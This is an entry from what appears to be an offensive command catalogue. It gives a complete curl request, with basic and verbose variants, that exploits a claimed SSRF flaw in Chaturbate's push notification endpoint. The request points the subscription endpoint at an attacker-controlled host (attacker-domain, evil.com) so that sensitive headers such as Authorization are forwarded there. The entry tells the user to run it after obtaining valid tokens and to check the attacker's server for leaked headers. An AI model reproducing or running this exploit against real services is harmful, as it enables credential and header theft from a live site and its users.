---
data: >-
  curl -X POST https://chaturbate.com/notifications/update_push/ -H "Host:
  chaturbate.com" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64;
  rv:62.0) Gecko/20100101 Firefox/62.0" -H "Accept: */*" -H "Accept-Language:
  en-US,en;q=0.5" -H "Referer: https://chaturbate.com/princesscin/" -H
  "Content-Type: application/x-www-form-urlencoded" -H "X-CSRFToken:
  YOURCSRFHERE" -H "X-Requested-With: XMLHttpRequest" -H "Cookie:
  YOURCOOKIEHERE" -d
  'subscription={"endpoint":"http:\/\/attacker-domain\/wpush\/v2\/_facile?id=1","unsub":false}'
tags:
  - ssrf
  - web-exploit
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.075Z'
id: fdc8dab9-61b9-4a8f-842b-c3d2cbf36ea6
verified: false
validated: true
submitted: true
---
# chaturbate-ssrf-push-subscription

## Command

```bash
curl -X POST https://chaturbate.com/notifications/update_push/ \
  -H "Host: chaturbate.com" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" \
  -H "Accept: */*" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Referer: https://chaturbate.com/princesscin/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-CSRFToken: YOURCSRFHERE" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Cookie: YOURCOOKIEHERE" \
  --data 'subscription={"endpoint":"http:\/\/attacker-domain\/wpush\/v2\/_facile?id=1","unsub":false}'
```

## Description

This curl command sends a crafted POST request to exploit the SSRF vulnerability in Chaturbate's push notification endpoint, setting an arbitrary endpoint URL to trigger forwarding of sensitive headers to the attacker's server. Use after obtaining valid tokens.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "X-CSRFToken: YOURCSRFHERE"` | CSRF protection token | Yes |
| `-H "Cookie: YOURCOOKIEHERE"` | Session authentication cookie | Yes |
| `--data 'subscription=...'` | JSON payload with endpoint and unsub flag | Yes |
| `subscription.endpoint` | Attacker-controlled URL (URL-encoded) | Yes |
| `unsub` | Set to false for subscription | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://chaturbate.com/notifications/update_push/ -H "Cookie: session=abc" -H "X-CSRFToken: def" -d 'subscription={"endpoint":"http://evil.com/test","unsub":false}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST https://chaturbate.com/notifications/update_push/ -H "Cookie: session=abc" -H "X-CSRFToken: def" -d 'subscription={"endpoint":"http://evil.com/wpush/v2/_facile?id=1","unsub":false}'
```

## Expected Output

HTTP 200 OK response from Chaturbate; no direct error, but check attacker's server for incoming request with leaked headers like Authorization.

## Related

- [[Related Procedure: Craft-and-Send-SSRF-Push-Subscription-Request]]
